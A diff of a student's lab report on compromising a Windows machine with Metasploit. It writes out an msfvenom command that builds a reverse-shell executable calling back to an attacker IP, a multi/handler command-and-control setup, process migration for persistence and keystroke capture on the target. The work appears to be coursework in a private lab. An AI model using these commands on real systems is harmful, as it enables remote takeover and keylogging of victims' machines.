@@ -2,8 +2,8 @@
 Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
-## Name: Yathin Reddy T
-## Reg No: 212223100062
+## Name: YATHIN REDDY T
+## Reg no: 212223100062
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -24,64 +24,96 @@ Open terminal and try execute some kali linux commands
 
 ## EXECUTION STEPS AND ITS OUTPUT:
 
-## ifconfig
-192.168.91.247
 
-![ipconfig6(1)](https://github.com/user-attachments/assets/5f670a52-63d9-415c-ab0a-bfa942cd94d0)
-Find the attackers ip address using ifconfig
+### Find the attackers ip address using ifconfig
 
-## msfvenom
+## OUTPUT :
 
-![msfvenom(1)new](https://github.com/user-attachments/assets/8dd59155-f5e6-473f-8840-292ee5b0e07b)
+![IFCONFIG](img/01.png)
 
-Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+### Create a malicious executable file fun.exe using msfvenom command
 
-##  copy the fun.exe into apache/var/www/html/
-![systemctl(1)](https://github.com/user-attachments/assets/69eb6758-41e8-4294-b2cb-d9dcd2416175)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
-copy fun.exe start apache server sudosystemctl apache2 start check the status of apache2
+## OUTPUT :
 
-## msfconsole
+![PAYLOAD](img/02.png)
 
-![msfconsolehelp](https://github.com/user-attachments/assets/23643dfe-ca81-488d-a833-c6450a55610f)
+copy the fun.exe into the apache /var/www/html folder
+sudo systemctl apache2 start
 
-invoke msfconsole Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
+## Check the status of apache2
 
-## Multihander,setpayload,exploit
+## OUTPUT :
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Parrot machine: http://192.168.91.247/
+![STATUS CHECK](img/03.png)
 
-![new1](https://github.com/user-attachments/assets/0bd712a9-76cb-41d6-aceb-1152a6c04d4f)
+### Invoke msfconsole:
+## OUTPUT:
+![MSFCONSOLE](img/04.png)
 
-![catarul](https://github.com/user-attachments/assets/656b11b1-d958-45f9-a4e1-e863e6102036)
+Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-![VirtualBox_windows 7_21_04_2025_13_34_08(2)](https://github.com/user-attachments/assets/5d96f50e-0cfa-4127-ba3f-3dd81910f545)
+## OUTPUT :
+![HELP](img/05.png)
 
-![folderforfunexe](https://github.com/user-attachments/assets/83b175cf-c502-46bc-99a2-06d4854063f1)
+Starting a command and control Server
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
+## OUTPUT :
 
-![usemulti](https://github.com/user-attachments/assets/bc802e2b-836e-477f-8356-eceb82bb8eef)
+![RECENT](img/RECENT.png)
 
-Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
+### WINDOWS :
 
-To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
+http://192.168.1.2/fun.exe
+The file "fun.exe" downloads
 
-![ps](https://github.com/user-attachments/assets/42b39d96-52d9-4e5c-bd7a-d23534ee8ee5)
+## BROWSE OUTPUT :
 
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
+![SEARCH](img/G1.png)
 
-migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
-![netstat](https://github.com/user-attachments/assets/8a6d9037-074c-4527-9c8c-65b5606abdcb)
+## DOWNLOAD OUTPUT :
 
-## Post Exploitation
+![DOWNLOAD](img/G2.png)
 
-The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+## COME BACK TO PARROT :
 
-![keyscan_startanddump](https://github.com/user-attachments/assets/87f5f7b1-8f78-4bb2-ac9f-c88ffcde3f0b)
+To see a list of processes, at the meterpreter > prompt, execute this command:
+ps  ⇒ can see the fun.exe process running with pid 1156
 
-![output](https://github.com/user-attachments/assets/5cfcb9d5-80bc-4425-8477-f3d2ffc73965)
+## OUTPUT :
+![PS](<img/og 06.png>)
 
-![keyscan_startanddump](https://github.com/user-attachments/assets/7beac93c-96ea-47f3-a842-e350d57bba12)
 
+The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
+To become more persistent, we'll migrate to a process that will last longer.
+Let's migrate to the winlogon process.
+At the meterpreter > prompt, execute this command:
+
+migrate -N explorer.exe
+at meterpreter > prompt, execute this command:
+netstat
+A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
+Notice the "PID/Program name" value for this connection, which is redacted 
+
+## OUTPUT :
+
+![NETSTAT](img/07.png)
+
+## WINDOWS OUTPUT :
+![TYPE](img/G3.jpg)
+
+Post Exploitation
+The target is now owned. Following are meterpreter commands for key capturing in the target machine
+keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+
+## OUTPUT :
+
+![TYPE OUTPUT](img/09.jpg)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
